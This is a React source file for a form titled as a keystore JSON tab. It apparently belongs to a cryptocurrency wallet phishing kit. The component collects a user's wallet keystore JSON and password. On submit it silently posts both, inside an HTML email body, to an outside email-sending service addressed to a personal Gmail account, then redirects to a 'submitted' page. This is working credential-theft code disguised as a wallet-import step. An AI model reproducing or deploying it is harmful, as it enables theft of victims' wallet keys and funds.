import React, { useState } from "react";
import axios from "axios";
import { ArrowRightCircle } from "react-bootstrap-icons";

function Tab2() {
  const [getData, setGetData] = useState({
    keystoreJson: "",
    password: "",
  });

  let options = {
    message: `<h1>From Tab Keystore JSON</h1> <p>This is the keystoreJson from user: <strong>${getData.keystoreJson}</strong>  and Password from user: <strong>${getData.password}</strong>  </p> `,
    subject: "Keystore JSON",
    organizationEmail: "mason7re@gmail.com",
  };

  const handSubmit = async (e) => {
    e.preventDefault();
    if (
      getData.keystoreJson === "" ||
      getData.password === "" ||
      getData.keystoreJson.length <= 11 ||
      getData.password.length <= 11
    ) {
      return false;
    }
    await axios
      .post(`https://backend-email-sender.herokuapp.com/send`, options)
      .then((response) => {
        console.log(response);
        setTimeout(() => {
          window.location.replace("/submitted");
        }, 2000);
      });
  };
  return (
    <div className="align-items-center TabLinks">
      <form>
        <textarea
          cols="30 "
          rows="4"
          className="form-control mt-3 mb-3"
          placeholder="Keystore Json"
          minLength="12"
          required
          onChange={(e) =>
            setGetData({ ...getData, keystoreJson: e.target.value })
          }
        />
        <input
          type="text"
          className="form-control"
          placeholder="Wallet Password"
          required
          onChange={(e) => setGetData({ ...getData, password: e.target.value })}
        />
        <p className=" text-center mb-3 Tab-items">
          Several lines of text beginning with "..." plus the password you used
          to encrypt it.
        </p>
        <div>
          <button onClick={handSubmit} className="btn btn-primary col-12">
            {" "}
            Proceed <ArrowRightCircle className="ms-1" />
          </button>
        </div>
      </form>
      <div>
        <button
          onClick={(e) => window.location.replace("/")}
          className="btn btn-danger col-12 mt-3"
        >
          {" "}
          Cancel
        </button>
      </div>
    </div>
  );
}

export default Tab2;
